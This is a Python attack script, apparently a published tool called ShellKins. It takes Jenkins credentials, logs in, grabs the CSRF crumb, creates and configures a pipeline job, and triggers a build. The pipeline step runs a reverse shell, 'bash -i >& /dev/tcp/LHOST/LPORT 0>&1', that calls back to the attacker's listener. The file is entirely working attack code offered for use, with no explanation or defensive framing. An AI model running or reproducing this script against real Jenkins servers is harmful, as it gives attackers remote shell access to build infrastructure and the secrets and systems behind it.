#!/bin/python3

__title__ = 'ShellKins'
__version__ = '1.0'
__author__ = 'Hassan Mohammadi (HSNHK)'
__license__ = 'MIT'
__copyright__ = 'Copyright 2022 by Hassan Mohammadi'

import sys
import json
import argparse
import requests
from http import HTTPStatus


class ShellkinsSDK:
    def __init__(self, 
        session:requests.Session,
        host:str,
        username:str,
        password:str
    ) -> None:
        self.session = session
        self.host = host
        self.username = username
        self.password = password
        self.crumb: str = None

        if self.host[-1] != "/":
            self.host+="/"

    def getsession(self) -> int:
        url = "{}login?from=%2F".format(self.host)
        return self.session.get(url).status_code

    def login(self) -> int:
        loginUrl = "{}j_acegi_security_check".format(self.host)

        return self.session.post(
            loginUrl,
            data={
                "j_username": self.username,
                "j_password": self.password,
                "Submit": "Sign+in",
                "remember_me":"on"
            },
            allow_redirects=True
        ).status_code

    def loadCrumb(self) -> str:
        newJobUrl = "{}view/all/newJob".format(self.host)

        res = self.session.get(newJobUrl)
        if  "Jenkins-Crumb" in res.text:
            self.crumb = str(res.text).split("Jenkins-Crumb")[1].split('">')[0].split('="')[1]
            return self.crumb
        return None
    
    def createPipLine(self, name="Shellkins") -> int:
        pipUrl = "{}view/all/createItem".format(self.host)

        body = {
            "name": name,
            "mode": "org.jenkinsci.plugins.workflow.job.WorkflowJob",
            "from": "",
            "Jenkins-Crumb": self.crumb
        }

        return self.session.post(
            pipUrl,
            data={
                "name": name,
                "mode": "org.jenkinsci.plugins.workflow.job.WorkflowJob",
                "from": "",
                "Jenkins-Crumb": self.crumb,
                "json": json.dumps(body)
            }
        ).status_code
    
    def pipLineConfig(self, name:str="Shellkins", payload:str=None) -> int:
        body = {
                "description": "Shellkins",
                "properties": {
                "stapler-class-bag": "true",
                "jenkins-model-BuildDiscarderProperty":{
                        "specified": "false",
                        "": "0",
                        "strategy":{
                        "daysToKeepStr":"",
                        "numToKeepStr": "",
                        "artifactDaysToKeepStr": "",
                        "artifactNumToKeepStr": "",
                        "stapler-class": "hudson.tasks.LogRotator",
                        "$class": "hudson.tasks.LogRotator"
                        }
                    },
                "org-jenkinsci-plugins-workflow-job-properties-DisableConcurrentBuildsJobProperty": {
                    "specified": "false"
                    },
                "org-jenkinsci-plugins-workflow-job-properties-DisableResumeJobProperty": {
                    "specified": "false"
                    },
                "com-coravy-hudson-plugins-github-GithubProjectProperty": {},
                "org-jenkinsci-plugins-workflow-job-properties-DurabilityHintJobProperty": {
                    "specified": "false",
                    "hint": "MAX_SURVIVABILITY"
                },
                "org-jenkinsci-plugins-pipeline-modeldefinition-properties-PreserveStashesJobProperty": {
                        "specified": "false",
                        "buildCount": "1"
                    },
                "hudson-model-ParametersDefinitionProperty": {
                        "specified": "false"
                    },
                "jenkins-branch-RateLimitBranchProperty$JobPropertyImpl": {},
                "org-jenkinsci-plugins-workflow-job-properties-PipelineTriggersJobProperty": {
                        "triggers": {
                            "stapler-class-bag": "true"
                            }
                    }
                },
                "disable": "false",
                "hasCustomQuietPeriod": "false",
                "quiet_period": "5",
                "displayNameOrNull": "",
                "": "0",
                "definition":{
                    "script": "node {\n    sh '''#!/bin/bash \\n \n       "+payload+"'''\n}",
                    "": "\u0001\u0001",
                    "sandbox": "true",
                    "stapler-class": "org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition",
                    "$class": "org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition"
                    },
                "core:apply": "", "Jenkins-Crumb": self.crumb
            }
            
        pipLineUrl = "{}job/{}/configSubmit".format(self.host, name)
        return self.session.post(
            pipLineUrl,
            data={
                "description": "Shellkins",
                "Jenkins-Crumb": self.crumb,
                "json": json.dumps(body),
                "Submit": "Save"
            }
        ).status_code

    def buildPipLine(self, name:str="Shellkins") ->int:
        buildUrl = "{}job/{}/build?delay=0sec".format(self.host, name)
        return self.session.post(
            buildUrl,
            data={
                "Jenkins-Crumb": self.crumb
            }
        ).status_code

def main(values:dict):
    session = requests.Session()
    jenkins = ShellkinsSDK(
        session,
        values["host"],
        values["user"],
        values["pass"],
    )
    
    payload = f"bash -i >& /dev/tcp/{values['lhost']}/{values['lport']} 0>&1"
    
    print("[...] Send initial request to server")
    status_code = jenkins.getsession()

    if status_code != HTTPStatus.OK:
        print("[*] Problem receiving session, status code:", status_code)
        sys.exit(1)
    else:
        print("session received, status code:", status_code)

    print("[...] Logging in to your account")
    status_code = jenkins.login()

    if status_code != HTTPStatus.OK:
        print("[*] Unable to authenticate account, status code:", status_code)
        sys.exit(1)
    else:
        print("Authentication completed successfully, status code:", status_code)

    print("[...] Load Jenkins-Crumb")
    crumb = jenkins.loadCrumb()

    if crumb == None:
        print("[*] Problem receiving crumb, There may be a problem authenticating the user")
        sys.exit(1)
    else:
        print("Jenkins-Crumb :", crumb)
    
    print("[...] Under construction PipeLine")
    status_code = jenkins.createPipLine()

    if status_code != HTTPStatus.OK:
        print("[*] Problem creating PipLine, status code:", status_code)
        sys.exit(1)
    else:
        print("PipeLine was created successfully, status code:", status_code)

    print("[...] Configuring PipeLine")
    status_code = jenkins.pipLineConfig(payload=payload)

    if status_code != HTTPStatus.OK:
        print("[*] Problem in pipline configuration")
        sys.exit(1)
    else:
        print("PipeLine successfully configured, status code:", status_code)

    print("[...] PipeLine is under build")
    status_code = jenkins.buildPipLine()

    if status_code != HTTPStatus.CREATED:
        print("[*] Problem in pipline building")
        sys.exit(1)
    else:
        print("pipeline builded")

if __name__ == "__main__":
    parser = argparse.ArgumentParser( 
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="Jenkins Remote Command Execution \n"\
        "github : https://github.com/HSNHK/Shellkins \n"\
        "by Hassan Mohammadi"
    )
    
    parser.add_argument(
        "--host" , type=str ,
        help="jenkins host address"
    )

    parser.add_argument(
        "-u", "--user" , type=str ,
        help="jenkins account username"
    )

    parser.add_argument(
        "-p", "--pass" , type=str ,
        help="jenkins account password"
    )

    parser.add_argument(
        "--lhost" , type=str ,
        help="local listener address"
    )

    parser.add_argument(
        "--lport" , type=str ,
        help="local listener port"
    )
    
    args = parser.parse_args()
    
    check = filter(lambda x: x[1] != None , args._get_kwargs())
    if len(list(check)) == 5:
        main(dict(args._get_kwargs()))
    else:
        print("[*] Fields are not set correctly")
        parser.print_help()

